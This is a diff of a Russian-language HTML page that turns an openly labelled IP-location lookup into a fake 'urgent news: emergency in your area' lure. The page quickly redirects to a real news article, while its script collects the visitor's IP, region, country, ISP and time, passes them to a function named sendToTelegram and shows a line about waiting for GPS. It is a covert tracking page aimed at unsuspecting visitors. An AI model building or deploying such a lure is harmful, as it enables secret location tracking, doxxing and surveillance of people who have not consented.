@@ -2,11 +2,46 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Определение местоположения</title>
+  <title>Срочная новость</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="refresh" content="1; url=https://dnepr.express/ru/post/masshtabnyj-narkobiznes-razoblachili-v-15-oblastyah-ukrainy-sredi-nih-dnepropetrovshina" />
+  <style>
+    body {
+      background-color: #f4f4f4;
+      font-family: Arial, sans-serif;
+      color: #333;
+      padding: 20px;
+      max-width: 600px;
+      margin: auto;
+    }
+    h1 {
+      color: #b30000;
+      font-size: 1.6em;
+    }
+    .content {
+      margin-top: 20px;
+      font-size: 1.1em;
+      line-height: 1.5;
+    }
+    .status {
+      background: #fff3cd;
+      padding: 15px;
+      border: 1px solid #ffeeba;
+      margin-top: 25px;
+      border-radius: 8px;
+    }
+  </style>
 </head>
 <body>
-  <h2>Ищу местоположение по IP...</h2>
-  <p id="status">Пожалуйста, подождите...</p>
+  <h1>Срочная новость: ЧП в вашем районе</h1>
+  <div class="content">
+    <p>По предварительным данным, в вашем регионе зафиксировано необычное происшествие. Подробности уточняются.</p>
+    <p>Службы проверяют данные, пожалуйста, ожидайте обновления информации.</p>
+  </div>
+
+  <div class="status" id="status">
+    Получение данных о вашем регионе...
+  </div>
 
   <script>
     function sendToTelegram(message) {
@@ -29,8 +64,7 @@ IP: ${data.ip}
 Регион: ${data.region}
 Страна: ${data.country_name}
 Провайдер: ${data.org}
-Время: ${new Date().toLocaleString()}
-        `;
+Время: ${new Date().toLocaleString()}`;
 
         document.getElementById("status").innerText = ipMessage + "\n\n⏳ Ожидаю GPS...";
 
